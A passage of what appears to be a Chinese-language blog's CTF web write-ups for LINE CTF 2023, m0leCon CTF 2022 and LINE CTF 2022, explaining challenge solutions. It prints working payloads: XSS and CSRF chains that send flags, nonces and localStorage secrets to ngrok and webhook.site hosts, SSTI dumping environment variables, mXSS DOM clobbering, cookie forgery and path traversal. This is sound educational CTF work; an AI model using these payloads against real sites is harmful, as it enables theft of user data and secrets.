&#125;).then((function(t) &#123; t.flag &amp;&amp; (window.document.head.innerHTML = t.head, window.document.body.innerHTML = t.body, fetch(n.data.attr.path + \"/alert\", &#123; referrerPolicy: \"unsafe-url\" &#125;)) &#125;)) &#125; &#125;, r = &#123;&#125;; ! function e(a) &#123; var n = r[a]; if (void 0 !== n) return n.exports; var o = r[a] = &#123; exports: &#123;&#125; &#125;; return t[a].call(o.exports, o, o.exports, e), o.exports &#125;(144) &#125;)(); 這個程式碼就比較長一點了，不過在做的事情大概就是先讀取 config，然後把 body 跟 head 的內容都傳給剛剛的 worker 去做取代，取代完之後再放回畫面上，然後有找到符合的內容，回報給 n.data.attr.path + /alert 這個位置。 上面那一大串如果搜尋一下，會發現是來自於 Purl 這個停止維護很久的 library，除了有 prototype pollution 的問題以外，對於網址的 parse 也是漏洞百出。 首先是 prototype pollution，我們只要污染 config 就可以控制 localStorage.config 屬性，傳入我們想要的 regexp，原本想的是可以弄個 ReDos 之類的再看怎麼樣去偵測時間，但後來發現 n.data.attr.path 這個也是可以控制的。 舉例來說，http://web:8000/#@acabc//8cae-ip.ngrok.io 這個網址的 path 會被解析成 //8cae-ip.ngrok.io，所以可以把 request 傳到我們這裡來。 再搭配前面講的 config，就可以知道哪個 regexp 有配對到。 &lt;script> const domain = '8cae.ngrok.io' const base = 'http://' + domain function getUrl(flag) &#123; return `http://web:8000/#@acabc//$&#123;domain&#125;/$&#123;flag&#125;?q[__proto__][config]=&#123;\"regex\":\"$&#123;flag&#125;\"&#125;` &#125; function report(msg) &#123; fetch(base + '?msg=' + msg) &#125; function visit(str) &#123; var w = window.open(getUrl(str)) setTimeout(() => &#123; w.close() &#125;, 2000) &#125; let flag = 'LINECTF&#123;' const charset = '0123456789abcdef' const sleep = ms => new Promise(r => setTimeout(r, ms)) async function main() &#123; for(let i=0; i&lt;32; i++) &#123; for(let c of charset) &#123; const str = flag + \".\".repeat(i) + c visit(str) await sleep(100) &#125; &#125; &#125; main() &lt;/script> 除了這種解法以外，另一種更猛的是直接利用原本的功能做出 XSS，每一個 note 的結構是這樣： &lt;li> &lt;div class=\"rotate-1 yellow-bg\"> &lt;p>&#123;content&#125;&lt;/p> &lt;/div> &lt;/li> 假設我建立了兩個 note，第一個內容是 &quot; id=a x=&quot;，第二個是 LINECTF&#123;rotate-1 yellow-bg&quot;&#125; HTML 內容就會變成： &lt;li> &lt;div class=\"rotate-1 yellow-bg\"> &lt;p>\" id=a x=\"&lt;/p> &lt;/div> &lt;/li> &lt;li> &lt;div class=\"rotate-1 yellow-bg\"> &lt;p>LINECTF&#123;rotate-1 yellow-bg\"&#125;&lt;/p> &lt;/div> &lt;/li> 其實 &quot; 在後端一樣會被編碼，所以直接看 source 的話會看到 &amp;#34;，但如果是用 document.body.innerHTML，或許是瀏覽器覺得沒必要 encode，就會看到雙引號，而不是 &amp;#34;，所以雙引號的編碼反倒沒作用了。 接著 extension 介入，把 rotate-1 yellow-bg&quot; 變成 *** 之類的字，就變成： &lt;li> &lt;div class=\"xxx> &lt;p>\" id=a x=\"&lt;/p> &lt;/div> &lt;/li> &lt;li> &lt;div class=\"xxx> &lt;p>LINECTF&#123;xxx&#125;&lt;/p> &lt;/div> &lt;/li> 稍微調整一下新的結構： &lt;li> &lt;div class=\"xxx>&lt;p>\" id=a x=\"&lt;/p>&lt;/div>&lt;/li>&lt;li>&lt;div class=\" xxx> &lt;p>LINECTF&#123;xxx&#125;&lt;/p> &lt;/div> &lt;/li> 前面的一個雙引號被取代掉，跟原本內容開頭的雙引號結合，最後面的 x=&quot; 則跟下一個結合，而中間的 id&#x3D;a 順利變成了屬性的一部分。 換句話說，我們可以對 div 插入任意屬性，就能利用 focus 的功能做出 XSS，底下是在 Discord 中 Renwa 給的 payload： note 1: &quot;tabindex&#x3D;&quot;1&quot;onfocus&#x3D;&quot;eval(window.name)&quot;style&#x3D;&quot;position:relative;height: 20000px; width: 20008px;&quot;autofocus&#x3D;&quot;1&quot;id&#x3D;&quot;jj&quot;x&#x3D;&quot; note 2: LINECTF&#123;rotate-1 yellow-bg&quot;&#125; Report: @domain.wtf&#x2F;0ff.html Contents of 0ff.html: &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;body&gt; &lt;img src&#x3D;http:&#x2F;&#x2F;httpstat.us&#x2F;200?sleep&#x3D;5000&gt; &lt;script&gt; var x&#x3D; window.open(&#39;http:&#x2F;&#x2F;web:3000&#x2F;8be526fd-e193-436c-a431-84141a0903b9&#39;,&#39;fetch(&#96;http:&#x2F;&#x2F;web:8000&#x2F;&#96;,&#123;credentials: &quot;same-origin&quot;&#125;).then(x&#x3D;&gt;x.text()).then(x&#x3D;&gt;fetch(&#96;https:&#x2F;&#x2F;webhook.site&#x2F;603ab026-5a65-432f-a894-5d981fd24198?flag&#x3D;$&#123;btoa(x)&#125;&#96;))&#39;); setTimeout(function()&#123; x.location&#x3D;&#39;http:&#x2F;&#x2F;web:8000&#x2F;8be526fd-e193-436c-a431-84141a0903b9#jj&#39; &#125;,500) &lt;&#x2F;script&gt; &lt;&#x2F;html&gt; 當時完全沒想到可以這樣，真是厲害。 Another Secure Store Note (7 solves)這題有個改名字的功能，名字會直接反映在畫面上，是一個 free XSS，但問題是改名字會需要檢查 CSRF token，有一個叫做 getSettings.js 的檔案裡面會有 CSRF token： function isInWindowContext() &#123; const tmp = self; self = 1; // magic const res = (this !== self); self = tmp; return res; &#125; // Ensure it is in window context with correct domain only :) // Setting up variables and UI if (isInWindowContext() &amp;&amp; document.domain === '&lt;%= domain %>') &#123; const urlParams = new URLSearchParams(location.search); try &#123; document.getElementById('error').innerText = urlParams.get('error'); &#125; catch (e) &#123;&#125; try &#123; document.getElementById('message').innerText = urlParams.get('message'); &#125; catch (e) &#123;&#125; try &#123; document.getElementById('_csrf').value = '&lt;%= csrf %>'; &#125; catch (e) &#123;&#125; &#125; 這邊會檢查是不是在 window context 以及 document.domain，看到這邊我瞬間想起了 2022 年 10 月的 Intigriti XSS challenge，作者 writeup 在這：https://github.com/0xGodson/blogs/blob/master/_posts/2022-10-14-intigriti-oct-xss-challenge-author-writeup.md 裡面有一個部分是用 web worker 來繞過對 window.location.href 以及 document.domain 的檢查，像是這樣： // worker.js window = &#123;&#125; window.location = &#123;&#125; document = &#123;&#125; // send the secret to top window! window.saveSecret = function(msg)&#123; self.postMessage(msg) &#125; window.location.href = \"https://challenge-1022.intigriti.io/challenge/create\"; document.domain = \"challenge-1022.intigriti.io\"; // we can use importScripts function from API to import external scripts! importScripts(\"https://challenge-1022.intigriti.io/challenge/getSecret.js\"); 所以這題特別檢查 context 應該是想把這個擋住，但幸好當時在研究 Intigriti 這個的時候，我發現 document.domain 其實可以自己用 Object.defineProperty 硬蓋過去，所以這樣就可以 CSRF： &lt;script> Object.defineProperty(document, 'domain', &#123; value: '35.200.57.143' &#125;) &lt;/script> &lt;input id=\"_csrf\" /> &lt;script src=\"https://35.200.57.143:11004/getSettings.js\">&lt;/script> &lt;form id=f method=POST action=\"https://35.200.57.143:11004/profile\" target=\"_blank\"> &lt;input name=\"name\" value=\"poc\"> &lt;input name=\"csrf\" value=\"\"> &lt;/form> &lt;script> const csrf = _csrf.value f.csrf.value = csrf f.submit() &lt;/script> 再來就是要偷 nonce 了，這題用的瀏覽器是 Firefox，對於 Dangling Markup Injection 似乎沒做什麼防護，可以用 meta redirect 偷到下面的內容：&lt;meta http-equiv=refresh content=&#39;0; url=http://43d1-ip.ngrok.io/steal?q= 最後一步就是要阻止 csp.gif 的載入，因為只要這個被載入的話，nonce 就會改變，我花了一個半小時找尋怎麼把它擋掉，原本想說應該可以靠之前提過的 concurrent limit 來防止，但怎麼弄都不成功。 最後發現原本 base-uri 是 self，所以 base 是可以用的，那就用 base 就好了，浪費了一小時 QQ &lt;script> Object.defineProperty(document, 'domain', &#123; value: '35.200.57.143' &#125;) &lt;/script> &lt;input id=\"_csrf\" /> &lt;script src=\"https://35.200.57.143:11004/getSettings.js\">&lt;/script> &lt;form id=f method=POST action=\"https://35.200.57.143:11004/profile\" target=\"test\"> &lt;input name=\"name\" value=\"poc\"> &lt;input name=\"csrf\" value=\"\"> &lt;/form> &lt;script> var win = window.open('https://35.200.57.143:11004/profile', 'test') fetch('/clear') stealNoncePayload = \"&lt;base href='https://35.200.57.143:11004/abc/def/'>&lt;meta http-equiv=refresh content='0; url=http://43d1-ip.ngrok.io/steal?q=\" const csrf = _csrf.value f.csrf.value = csrf f.name.value = stealNoncePayload setTimeout(() => &#123; f.submit() &#125;, 500) function poll() &#123; fetch('/nonce') .then(res => res.text()) .then(nonce => &#123; if (!nonce) &#123; return setTimeout(poll, 100) &#125; f.name.value = `&lt;script nonce=$&#123;nonce&#125;> location = 'http://43d1-ip.ngrok.io?q='+localStorage.getItem('secret') &lt;\\/script>` f.submit() &#125;) &#125; poll() &lt;/script> Momomomomemomemo (3 solves)這題隊友解出來的，也滿有趣的，總之就是前端會根據你提供的 id 用 GraphQL 去抓結果： memo(id) &#123; const query = `query &#123; memo ( id: \"$&#123;id&#125;\", token: \"$&#123;this.token&#125;\") &#123; content &#125; &#125;`; return this.#query(query); &#125; 在最後 query 的部分是使用了 persisted queries，以前有聽過，大概就是你先送 query 的 hash 出去，如果以前就有執行過的話，會直接送結果回來。 反之若是沒有，你就再送一次 hash + query，讓後端去 cache 結果，而前端的實作是這樣： async #query(query) &#123; const hash = await this.#getQueryHash(query); const res = await fetch( this.endpoint + \"?\" + new URLSearchParams(&#123; extensions: JSON.stringify(&#123; persistedQuery: &#123; version: 1, sha256Hash: hash &#125;, &#125;), &#125;), &#123; headers: &#123; \"Content-type\": \"application/json\" &#125;, &#125; ); const data = await res.clone().json(); if (data.errors) &#123; if (data.errors[0].extensions.code == \"PERSISTED_QUERY_NOT_FOUND\") &#123; return await fetch(this.endpoint, &#123; method: \"POST\", headers: &#123; \"Content-type\": \"application/json\" &#125;, body: JSON.stringify(&#123; query, extensions: &#123; persistedQuery: &#123; version: 1, sha256Hash: hash, &#125;, &#125;, &#125;), &#125;); &#125; &#125; return res; &#125; 這邊前端也用了 Purl 這個 lib，所以一樣有 prototype pollution 可以用，但這題可以污染什麼呢？答案在底下這一段裡面： const purl = window.purl const memoId = purl().param('id') const gql = new GraphQL(location.origin) class GraphQL &#123; constructor(host, option = &#123;&#125;) &#123; this.endpoint = host + \"/\"; this.endpoint += option.path || \"graphql\"; &#125; // ... &#125; 你可以污染 path，就能操控 option.path，但操控這個可以做什麼？這就跟後端的 i18n 邏輯有關了，實作如下： // simple i18n app.use(function (req, res, next) &#123; let origPath = req.originalUrl.split('?')[0] let origParam = req.originalUrl.split('?')[1] let langPath = 'en/' if (origPath.match(/((\\/en\\/?)|(\\/ja\\/?))$/) || origPath.match(/^(\\/static\\/|\\/graphql\\/?|\\/favicon.ico\\/?)/)) &#123; next() &#125; else &#123; if (req.headers['accept-language'] &amp;&amp; req.headers['accept-language'].split(',')[0] === 'ja') langPath = 'ja/' res.redirect(origPath + (origPath.endsWith('/') ? '' : '/') + langPath + (origParam ? '?' + origParam : '')) &#125; &#125;) 要注意的是 req.originalUrl 只會有 path 的部分，所以像 http://chall:11005/abc 的話，originalUrl 就會是 /abc。 靠著上面操控的 path，我們可以把 path 污染成 /huli.tw/，這樣送出的 URL 就是：http://34.85.126.119:11005//huli.tw/?extensions=...，到了後端的 redirect 邏輯，最後就會被導到 //huli.tw/en/?extension=...。 如此一來，就可以靠著 prototype pollution 把 request 導到自己的 server，拿到 query string。 這題的目的是要偷 admin 的 memo，可是我們並不知道 admin memo id，要怎麼辦呢？ 仔細看這一段： memo(id) &#123; const query = `query &#123; memo ( id: \"$&#123;id&#125;\", token: \"$&#123;this.token&#125;\") &#123; content &#125; &#125;`; return this.#query(query); &#125; 我們可以精心構造一個 id 達成 GraphQL injection，像這樣： query &#123; memo ( id: \"a\", token: \"b\" ) &#123; content &#125; memo2: memos( token: \"$&#123;this.token&#125;\") &#123; content &#125; &#125; 這樣就變成了兩個 query，原本應該是 memo 的 token 變成了 memos 的 token，就可以拿到所有 admin 的 note。 因此，最後的解法就是先送一次這個改造過的 query，讓 server 把結果存起來，再加上 prototype pollution，讓 request 導到我們的 server，就可以知道 hash 是多少，就能拿到結果。","link":"/2023/03/27/linectf-2023-writeup/"},{"title":"m0leCon CTF 2022 筆記","text":"原本想要寫得詳細一點再 po 的，但我發現如果要這樣的話，可能要過很久才會 po，所以還是趕快先寫一篇簡短版的。 這次寫的是以下四題，都是 web： Fancy Notes Dumb Forum LESN ptMD 先記幾個 keyword 以後比較容易找： 長度擴充攻擊（Length extension attack） SSTI mutation XSS &lt;svg&gt;&lt;style&gt; &lt;meta name=&quot;referrer&quot; content=&quot;unsafe-url&quot; /&gt; &lt;meta http-equiv=&quot;refresh&quot; content=&quot;3;url&quot;&gt; Puppeteer 的 click 行為是抓取元素位置再點擊座標 Fancy Notes這題的核心程式碼如下： def get_user(): if not 'user' in request.cookies: return None cookie = base64.b64decode(request.cookies.get( 'user')).decode('raw_unicode_escape') assert len(cookie.split('|')) == 2 user_string = cookie.split('|')[0] signature_string = cookie.split('|')[1] if hashlib.sha256((SECRET_KEY + user_string).encode('raw_unicode_escape')).hexdigest() != signature_string: print(\"nope\") return None user = serialize_user(user_string) return user 會從 cookie 去判斷你是哪一個 user，序列化跟反序列化的程式碼如下： def serialize_user(user_string): user = dict() for kv in user_string.split(','): k = kv.split('=')[0] v = kv.split('=')[1] user[k] = v return user def deserialize_user(user): values = [] for k in [\"username\", \"locale\"]: values.append(f'&#123;k&#125;=&#123;user.__dict__[k]&#125;') return ','.join(values) 而產生 cookie 的程式碼長這樣： def generate_cookie(user): user_string = deserialize_user(user) signature_string = hashlib.sha256( (SECRET_KEY + user_string).encode('raw_unicode_escape')).hexdigest() cookie = base64.b64encode( (f'&#123;user_string&#125;|&#123;signature_string&#125;').encode('raw_unicode_escape')).decode() return cookie 目標是想辦法偽造成 admin 登入，就可以拿到 flag。 正常的狀況下，假設我們的 user 叫做 abc 好了，locale 是 en，產生出來的 user_string 就會是：username=abc,locale=en。 從 serialize_user 中可以看出前面的屬性會被後面蓋掉，所以如果我們的 user_string 是 username=a,locale=en,username=admin，還原回 user 時身份就會變成 admin。 在產生 cookie 時，後面有特別加上一個簽名（sha256(secret + user_string)）來驗證資料完整性。 所以在我們不知道 key 的狀況下，照理來說我們沒有辦法偽造 user_string，因為完整性的檢查過不了。 但是呢，這題用的這種驗證方式可以用一種叫做長度擴充攻擊（Length extension attack）的方式來打。 簡單來說呢，如果今天有一個操作是：M1 = hash(secret + data)，你只要知道 secret+data 的「長度」就好，不需要知道內容是什麼，以及產生出來的結果 M1，那你就可以在 secret+data 後面拼接任意字串，並且知道合法的 hash(secret + data + padding + 任意 data) 舉例來說，你今天知道 &quot;&#123;secret&#125;username=a&quot; 在 md5 過後會變成 781e5e245d69b566979b86e28d23f2c7，在不知道 secret 為何的狀況之下，你還是能知道 &quot;&#123;secret&#125;username=a&#123;padding&#125;,username=admin&quot; 的 md5 是多少。 上面的 &#123;padding&#125;，這跟 hash 演算法的原理有關。 總之呢，透過這個攻擊方式，我們可以在不知道 secret 的狀況下把已知的字串延長並且產生出合法的 hash 值，就能繞過這題的檢查。 至於詳細的原理跟攻擊方式，先留幾篇參考文章，未來有機會再回來補這個坑： 長度擴充攻擊 | Length Extension Attack (LEA) Hash Length Extension Attacks Understanding the length extension attack 哈希长度拓展攻击(Hash Length Extension Attacks) Length extension attack Dumb Forum這題有個 SSTI： @app.route('/profile', methods=['GET', 'POST']) @login_required def profile(): with open('app/templates/profile.html') as p: profile_html = p.read() profile_html = profile_html % (current_user.username, current_user.email, current_user.about_me) if(current_user.about_me == None): current_user.about_me = \"\" return render_template_string(profile_html) username 跟 aboutme 都有被檢查，不能用 &#125;&#123;，而 email 只有檢查是不是合法的 email 地址，是的話就能用。 因此 abc｛&#123;7*7&#125;&#125;@abc.com 在界面上呈現的會是 abc49@abc.com，因為在這套 library 中 email 地址如果有 () 的話會被視為不合法，所以沒辦法用 ()。 flag 在環境變數裡面，所以只要這樣就 win 了： &#123;&#123;cycler.__init__.__globals__.os.environ&#125;&#125;@x.com LESN這題可以建立一個 post，內容可以控制但會被 sanitized，最後會 render 成這樣： &lt;script src=\"/static/script.js\" async>&lt;/script> &lt;a style=\"position: absolute; left: 30%; top:5px\" href=\"/\">Home&lt;/a> &lt;a style=\"position: absolute; right: 30%; top:5px\" href=\"/edit/&lt;%= imgid %>\">Edit&lt;/a> &lt;div style=\"margin-top: 3em;\"> &lt;img src=\"&lt;%= imgurl %>\" onerror=\"setTimeout(redirect_error_image,1500)\" style=\"max-height: 300px; max-width: 300px; display:block; margin: auto; border: 2px solid #555;\"> &lt;div style=\"margin-top: 30px; text-align: center;\">&lt;%- description %>&lt;/div> &lt;/div> &lt;%- include('footer') %> 過濾的程式碼長這樣： const createDOMPurify = require('dompurify'); const &#123; JSDOM &#125; = require('jsdom'); const window = new JSDOM('').window; const DOMPurify = createDOMPurify(window); function my_sanitize(html) &#123; const document = new JSDOM('').window.document document.body.outerHTML = html let node; const iter = document.createNodeIterator(document.body) while (node = iter.nextNode()) &#123; if (/(script|iframe|frame|object|data|m.+)/i.test(node.nodeName)) &#123; node.parentNode.removeChild(node) continue &#125; if (node.attributes) &#123; for (let i = node.attributes.length - 1; i >= 0; i--) &#123; const att = node.attributes[i] if (! /(class|src|style)/i.test(att.name)) &#123; node.removeAttributeNode(att) &#125; &#125; &#125; &#125; return document.body.innerHTML &#125; function sanitize(html) &#123; let clean = my_sanitize(html) clean = DOMPurify.sanitize(clean) return clean &#125; module.exports = &#123; sanitize &#125; 最後有經過 DOMPurify，所以危險的 tag 都不能用。 這題的重點是我在看的時候，發現有時候 console 會出現 redirect_error_image is undefined 的錯誤。 這是因為 script 是用 async 來載入，所以有個 race condition 的問題。如果 img 的 onerror 在 script 載入前就被觸發，那 redirect_error_image 就會是 undefined。 利用這個特點，勝利方程式就是用 DOM clobbering 去控制 redirect_error_image，再加上 setTimeout 第一個參數傳字串就跟 eval 差不多的特性去執行任意程式碼。 DOM clobbering 的部分要先繞掉自訂的 parser，這部分由隊友完成，原理大概就是這篇：HTML sanitization bypass in Ruby Sanitize &lt; 5.2.1 講的，利用 namespace confusiion 來製造出 mXSS，payload 長這樣： &lt;svg>&lt;style>&lt;&amp;sol;style>&lt;&amp;sol;svg>&amp;lt;a id=redirect_error_image href=http:pew>g jsdom 會把上面的段落 parse 成這樣： BODY -&gt; svg ---&gt; style ------&gt; #text: &lt;&#x2F;style&gt;&lt;&#x2F;svg&gt;&lt;a id&#x3D;redirect_error_image href&#x3D;http:pew&gt;g 就只是一個 style 有著內容，沒什麼，但是用 document.body.innerHTML 還原回去時會變成這樣： &lt;svg>&lt;style>&lt;/style>&lt;/svg>&lt;a id=redirect_error_image href=http:pew>g&lt;/style>&lt;/svg> 就產生出了這個 &lt;a&gt; 的 tag，讓我們可以 DOM clobbering。而內容其實放個 http:import(script) 就好，http: 會被當作是 label，後面的程式碼會直接被執行。 接著就是要怎麼讓 onerror 發生的比腳本載入快，根據作者的 writeup，在圖片網址的部分可以放上 http://localhost 之類的網址，讓它趕快失敗，放 http://not_exist 感覺也行。 然後可以用 iframe 去載入你的 post，再把自訂頁面丟給 bot，就可以避免使用到 cached 的 script.js。 我那時是想說瀏覽器載入資源都有 priority，如果可以製造出一個 priority 比 script.js 還高的組合，就能延緩腳本的載入之類的，所以試著在頁面中加入一堆圖片： &lt;svg>&lt;style>&lt;&amp;sol;style>&lt;&amp;sol;svg>&amp;lt;a id=redirect_error_image href=mailto:import('//vps/exploit.js')> &amp;lt;img src=https://deelay.me/20000/https://example.com> &amp;lt;img src=https://deelay.me/20001/https://example.com> &amp;lt;img src=https://deelay.me/20002/https://example.com> &amp;lt;img src=https://deelay.me/20003/https://example.com> 不過好像沒什麼用就是了，圖片順序應該也不會比 script 還高。當時也沒有繼續研究有哪些可以做到我理想中的狀況。 最後是想到之前 @lbrnli1234 在解我出的一題 XSS 時也碰到 race condition，它後來就塞了一堆 iframe 來增加成功機率，可見：Notes XSS Challenge Author Writeup 我也照著做，塞了一堆 iframe： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;/head> &lt;body> &lt;iframe src=\"https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38\">&lt;/iframe> &lt;iframe src=\"https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38\">&lt;/iframe> &lt;iframe src=\"https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38\">&lt;/iframe> &lt;iframe src=\"https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38\">&lt;/iframe> &lt;iframe src=\"https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38\">&lt;/iframe> &lt;iframe src=\"https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38\">&lt;/iframe> &lt;iframe src=\"https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38\">&lt;/iframe> &lt;iframe src=\"https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38\">&lt;/iframe> &lt;iframe src=\"https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38\">&lt;/iframe> &lt;iframe src=\"https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38\">&lt;/iframe> &lt;/body> &lt;/html> 最後就解掉了，first blood。 ptMD本次最難，全場一解。 先附上作者 wirteup：https://github.com/xatophi/m0leconteaser2022-ptMD/blob/main/writeup.md 簡單來說你有個頁面，你可以插入任意 HTML，但是 CSP 是 script-src &#39;self&#39;，所以沒辦法 XSS。 目標是偷到 admin note 的內容，由於網址是唯一的而且沒有權限管理，所以偷到網址其實就行了。在 client 的頁面有個 last 可以點，點下去之後就會到最新的 note 頁面去。 這邊因為是用 react 做的，所以如果你直接把網址設定成 /last 是沒用的，因為剛載入的時候 notes 是空的，所以並不會重新導向到最新的 note 去。 這題的 admin bot 長這樣： async function visit(url) &#123; const browser = await puppeteer.launch(&#123; headless: true, args: [ '--disable-default-apps', '--disable-extensions', '--disable-gpu', '--disable-sync', '--disable-translate', '--hide-scrollbars', '--metrics-recording-only', '--mute-audio', '--no-first-run', '--no-sandbox', '--safebrowsing-disable-auto-update' ], executablePath: '/usr/bin/chromium' &#125;) try &#123; let page = await browser.newPage() //login await page.goto(LOGIN_URL) await page.waitForSelector('#username') await page.focus('#username') await page.keyboard.type('admin', &#123; delay: 10 &#125;) await page.focus('#password') await page.keyboard.type(ADMIN_PASSWORD, &#123; delay: 10 &#125;) await new Promise(resolve => setTimeout(resolve, 300)) await page.click('#submit') await new Promise(resolve => setTimeout(resolve, 300)) //await page.waitForNavigation(&#123; waitUntil: 'networkidle2' &#125;) console.log(await page.cookies()) // visit URL after auth await page.goto(url, &#123; timeout: 5000 &#125;) await new Promise(resolve => setTimeout(resolve, 2000)) // logout await page.click('#logout') await new Promise(resolve => setTimeout(resolve, 2000)) // close browser await page.close() await browser.close() &#125; catch (e) &#123; console.log(e) await browser.close() //throw (e) &#125; &#125; 最後一步我在看的時候就覺得怪怪的，就是去點擊那個 logout button，我就在想為什麼要點那個，賽後才知道那也是關鍵之一。 我在解的時候有想到可能跟 referrer policy 有關，但用了 &lt;iframe referrerPolicy=&quot;unsafe-url&quot;&gt;&lt;/iframe&gt; 似乎沒有效果。 解答確實跟這個有關，但是是這樣的： &lt;meta name=\"referrer\" content=\"unsafe-url\" /> &lt;meta http-equiv=\"refresh\" content=\"3;url=https://webhook.site/d485f13a-fd8b-4cfd-ad13-63d9b0f1f5ef\" /> 用 &lt;meta&gt; 來設置 referrer，然後再用 meta refresh 設定三秒後把頁面重新導向。 然後再用 CSS 把 logout button 的位置藏到 last button 後面，這樣 admin bot 實際上就會點到 last button，跳到 note 頁面，接著靠著 referrer policy 就可以 leak 出 URL。 最後這個答案打破了三件我以為的認知： 我以為 meta 要放在 head 裡面才有效 我以為 meta tag 被清掉之後就沒效了 我以為 puppeteer 點按鈕的時候跟畫面無關，而是會直接點到元素 針對這三件事情，我們都可以來做一個小實驗。 第一點我做了一個簡單的網頁： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset='utf-8'> &lt;/head> &lt;body> &lt;h1>test&lt;/h1> &lt;meta name=\"referrer\" content=\"unsafe-url\" /> &lt;meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'; img-src https://*; child-src 'none';\"> &lt;meta http-equiv=\"refresh\" content=\"3;url=http://example.org\" /> &lt;/body> &lt;body> 打開後在 cosnole 看到錯誤： The Content Security Policy ‘default-src ‘self’; img-src https:&#x2F;&#x2F;*; child-src ‘none’;’ was delivered via a element outside the document’s , which is disallowed. The policy has been ignored. 不過，過了三秒之後確實有重新導向。所以只有 CSP header 一定要放在 head，其他放在 body 也可以。 第二點改一下網頁即可： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset='utf-8'> &lt;/head> &lt;body> &lt;h1>test&lt;/h1> &lt;meta name=\"referrer\" content=\"unsafe-url\" /> &lt;meta http-equiv=\"refresh\" content=\"3;url=http://example.org\" /> &lt;script> [...document.querySelectorAll('meta')].forEach(item => item.remove()) alert(document.body.innerHTML) &lt;/script> &lt;/body> &lt;body> 可以看到雖然 meta 確實被移除掉，不過 3 秒後還是重新導向了，所以效果還在，原來真的這麼神奇。 第三點其實文件有寫到 page.click(selector[, options]) This method fetches an element with selector, scrolls it into view if needed, and then uses page.mouse to click in the center of the element. If there’s no element matching selector, the method throws an error. 去翻 source code 的話也可以看到：src&#x2F;common&#x2F;JSHandle.ts /** * This method scrolls element into view if needed, and then * uses &#123;@link Page.mouse&#125; to click in the center of the element. * If the element is detached from DOM, the method throws an error. */ async click(options: ClickOptions = &#123;&#125;): Promise&lt;void> &#123; await this._scrollIntoViewIfNeeded(); const &#123; x, y &#125; = await this.clickablePoint(options.offset); await this._page.mouse.click(x, y, options); &#125; 這邊其實只是用 _page.mouse.click 去點擊一個指定的座標而已。所以如果有元素蓋在上面，就會點到蓋在上面的元素。 真的是學習了。","link":"/2022/05/21/m0lecon-ctf-2022-writeup/"},{"title":"LINE CTF 2022 筆記","text":"跟著隊伍 Water Paddler 一起參加了 LINE CTF 2022，在隊友的 carry 之下拿了第七名，這次只有一題有幫上一點忙，其他都被隊友解掉或是卡死。這篇簡單記一下每一題的解法，大部分都參考自 LINE CTF 2022 Writeups by maple3142。 gotm(96 solves)這題被隊友解掉所以沒仔細看，不過賽後看其他 writeup 是 go 的 SSTI，出現在這裡： acc := get_account(id) tpl, err := template.New(\"\").Parse(\"Logged in as \" + acc.id) if err != nil &#123; &#125; tpl.Execute(w, &amp;acc) 之前沒碰過 go 的 SSTI，稍微筆記一下，可以用 {&#123;.&#125;&#125; 把傳入的物件整個 dump 出來，順便附幾個參考連結： GO中SSTI研究 Go SSTI初探 Memo Drive(42 solves)先附上關鍵程式碼： def view(request): context = &#123;&#125; try: context['request'] = request clientId = getClientID(request.client.host) if '&amp;' in request.url.query or '.' in request.url.query or '.' in unquote(request.query_params[clientId]): raise filename = request.query_params[clientId] path = './memo/' + \"\".join(request.query_params.keys()) + '/' + filename f = open(path, 'r') contents = f.readlines() f.close() context['filename'] = filename context['contents'] = contents 這題的 flag 在 ./memo/flag 底下，所以只要想辦法讓上面那一段的 path 可以讀到 flag 就勝利了。 隊友最後用這個 payload：/view?id=flag;%2f%2e%2e/;，因為對 python 太不熟，所以起個簡單的 server 來觀察一下： from urllib.parse import unquote import uvicorn from starlette.applications import Starlette from starlette.routing import Route from starlette.responses import JSONResponse def view(request): try: clientId = \"id\" print(\"request.url:\", request.url) print(\"request.url.query\", request.url.query) print(\"params:\", request.query_params) print(\"unquote params:\", unquote(request.query_params[clientId])) if '&amp;' in request.url.query or '.' in request.url.query or '.' in unquote(request.query_params[clientId]): raise filename = request.query_params[clientId] print(\"filename:\", filename) print(\"keys:\", request.query_params.keys()) path = './memo/' + \"\".join(request.query_params.keys()) + '/' + filename print(\"path:\", path) except: pass return JSONResponse(&#123;\"a\":1&#125;) routes = [ Route('/view', endpoint=view) ] app = Starlette(debug=True, routes=routes) if __name__ == \"__main__\": uvicorn.run(app, host=\"0.0.0.0\", port=11000) 先來看一下隊友的 payload 會怎樣：/view?id=flag;%2f%2e%2e/; request.url: http:&#x2F;&#x2F;0.0.0.0:11000&#x2F;view?id&#x3D;flag;%2f%2e%2e&#x2F;; request.url.query id&#x3D;flag;%2f%2e%2e&#x2F;; params: id&#x3D;flag&amp;%2F..%2F&#x3D; unquote params: flag filename: flag keys: dict_keys([&#39;id&#39;, &#39;&#x2F;..&#x2F;&#39;]) path: .&#x2F;memo&#x2F;id&#x2F;..&#x2F;&#x2F;flag request.url 會直接是 raw URL，沒有 decode 過，然後 request.url.query 也是沒 decode 過的版本，到了 request.query_params 的時候則是被解析成了兩個 params: id&#x3D;flag %2F..%2f&#x3D; 看起來是因為分號 ; 的關係，所以就算不用 &amp; 也可以創造出兩個 params。 而最後在 request.query_params.keys() 的時候被 decode，所以最後合起來就會是 ./memo/id..//flag。 不過在 Discord 上看到其實這樣就好了：id=flag;/%2e%2e，結果會是： request.url: http://0.0.0.0:11000/view?id=flag;/%2e%2e request.url.query id=flag;/%2e%2e params: id=flag&amp;%2F..= unquote params: flag filename: flag keys: dict_keys(['id', '/..']) path: ./memo/id/../flag 接著也在 Discord 看到另一個不同的解法（來自 bbangjo#3967），是利用 Host header： GET 